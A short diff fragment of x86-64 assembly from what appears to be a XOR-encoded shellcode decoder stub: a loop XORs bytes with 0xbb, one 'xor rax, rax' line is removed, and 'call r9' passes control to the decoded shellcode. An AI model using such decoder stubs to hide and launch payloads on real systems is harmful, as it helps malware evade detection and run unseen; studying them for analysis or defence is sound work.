@@ -75,7 +75,7 @@ jmp short Address
                   xor byte[rdi] , 0xbb
                   inc rdi
                   loop Xordecode
-                  xor rax, rax
+   
                call r9                ; pass control to shellcode
 
 
